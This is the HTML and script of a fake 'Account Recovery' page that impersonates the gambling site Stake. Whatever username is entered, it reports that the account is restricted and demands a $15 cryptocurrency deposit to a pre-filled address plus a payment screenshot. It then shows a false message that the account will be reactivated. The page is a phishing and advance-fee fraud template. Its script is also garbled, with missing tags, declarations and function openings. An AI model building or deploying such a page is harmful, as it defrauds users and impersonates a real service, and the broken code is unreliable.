<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Recovery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2f4553; /* Dark background */
            color: white;
            margin: 0;
            padding: 0;
        }

        .container {
            padding: 30px;
            max-width: 800px;
            margin: 0 auto;
            background-color: #1f2d36;
            border-radius: 8px;
        }

        .heading {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #00e701; /* Green color for heading */
            margin-bottom: 20px;
        }

        .input-group {
            margin: 20px 0;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"], select, input[type="number"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            border-radius: 5px;
            border: 1px solid #555;
            background-color: #333;
            color: white;
        }

        button {
            background-color: #00e701; /* Green for buttons */
            border: none;
            color: white;
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            display: inline-block;
        }

        button:disabled {
            background-color: #777;
        }

        .copy-btn {
            background-color: #444;
            padding: 8px;
            margin-top: 10px;
            cursor: pointer;
            border-radius: 5px;
        }

        .copy-btn:hover {
            background-color: #00e701;
        }

        #popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }

        #popup .popup-content {
            background-color: #333;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            width: 300px;
        }

        #popup button {
            background-color: #00e701;
            border: none;
            color: white;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }

        .blur {
            filter: blur(3px);
            pointer-events: none;
        }

        .message {
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="heading">Account Recovery</div>

        <!-- Username Section -->
        <div class="input-group">
            <label for="username">Username:</label>
            <input type="text" id="username" placeholder="Enter your username">
            <button id="verifyBtn">Verify</button>
            <div id="usernameMessage" class="message"></div>
        </div>

        <!-- Coin Selection -->
        <div class="input-group">
            <label for="coin">Select Coin:</label>
            <select id="coin">
                <option value="usdt">USDT</option>
                <option value="btc">BTC</option>
                <option value="trx">TRX</option>
                <option value="eth">Ethereum</option>
            </select>
        </div>

        <!-- Network Selection -->
        <div class="input-group">
            <label for="network">Select Network:</label>
            <select id="network">
                <option value="bsc">BSC</option>
                <option value="trc20">TRC20</option>
            </select>
        </div>

        <!-- Address and Copy Button -->
        <div class="input-group">
            <label for="address">Address:</label>
            <input type="text" id="address" disabled>
            <button class="copy-btn" id="copyBtn">Copy</button>
        </div>

        <!-- Amount Input -->
        <div class="input-group">
            <label for="amount">Amount:</label>
            <input type="number" id="amount" placeholder="Enter amount">
        </div>

        <!-- Screenshot Upload -->
        <div class="input-group">
            <label for="screenshot">Upload Screenshot:</label>
            <input type="file" id="screenshot">
        </div>

        <!-- Submit Button -->
        <div class="input-group">
            <button id="submitBtn" disabled>Submit</button>
        </div>
    </div>

    <!-- Popup -->
    <div id="popup">
        <div class="popup-content">
            <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
            <button id="okBtn">OK</button>
        </div>
    </div>

        verifyBtn.addEventListener('click', () => {
            usernameMessage.textContent = "Verifying...";

                usernameMessage.textContent = "Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.";

                verifyBtn.disabled = true;
            }, 1000);
        });

        // Update address based on selected coin and network
        coinSelect.addEventListener('change', updateAddress);

        function updateAddress() {
            const selectedCoin = coinSelect.value;
            const selectedNetwork = networkSelect.value;
            addressInput.value = addressMap[selectedCoin][selectedNetwork];
        }

        // Handle copy button
        copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(addressInput.value);
        });

        // Enable submit button when all fields are filled
        function checkSubmitButton() {
            submitBtn.disabled = !(usernameInput.value && isUsernameVerified && coinSelect.value && networkSelect.value && amountInput.value && screenshotInput.files.length > 0);
        }

        // Watch input fields
        usernameInput.addEventListener('input', checkSubmitButton);
        coinSelect.addEventListener('change', checkSubmitButton);
        networkSelect.addEventListener('change', checkSubmitButton);
        amountInput.addEventListener('input', checkSubmitButton);
        screenshotInput.addEventListener('change', checkSubmitButton);

        // Handle submit button

            container.classList.add('blur');  // Blur the background
            popup.style.display = 'flex';  // Show the popup
